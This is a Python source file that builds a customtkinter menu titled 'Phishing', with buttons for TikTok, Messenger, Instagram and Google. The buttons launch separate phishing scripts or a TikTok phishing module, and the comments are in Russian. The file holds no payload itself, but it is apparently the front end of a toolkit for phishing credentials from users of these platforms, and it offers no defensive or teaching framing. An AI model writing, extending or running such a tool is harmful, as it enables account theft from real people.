import os
import customtkinter as ctk

from Phishing.Tiktok import tiktok_ui

def clear_frame(frame):
    """Очищает все виджеты в указанном фрейме."""
    for widget in frame.winfo_children():
        widget.destroy()

def create_main_phishing_ui(parent_frame, go_back_callback=None):
    """Создает интерфейс для фишинга."""
    clear_frame(parent_frame)

    # Заголовок
    label_title = ctk.CTkLabel(parent_frame, text="Phishing", font=("Arial", 24))
    label_title.pack(pady=10)

    # Названия кнопок
    button_titles = [
        "Tik Tok", "Mesenger", "Instagram", 
        "Google"
    ]

    button_functions = [
        lambda: tiktok_ui(parent_frame, go_back_callback),
        lambda: os.system("python3 phishing/mesenger.py"),  # Лучше заменить на прямой вызов функции
        lambda: os.system("python3 phishing/instagram.py"),
        lambda: os.system("python3 phishing/google.py")
    ]

    # Создание кнопок по отдельности
    button_tiktok = ctk.CTkButton(parent_frame, text=button_titles[0], command=button_functions[0])
    button_tiktok.pack(pady=10, fill='x')

    button_mesenger = ctk.CTkButton(parent_frame, text=button_titles[1], command=button_functions[1])
    button_mesenger.pack(pady=10, fill='x')

    button_instagram = ctk.CTkButton(parent_frame, text=button_titles[2], command=button_functions[2])
    button_instagram.pack(pady=10, fill='x')

    button_google = ctk.CTkButton(parent_frame, text=button_titles[3], command=button_functions[3])
    button_google.pack(pady=10, fill='x')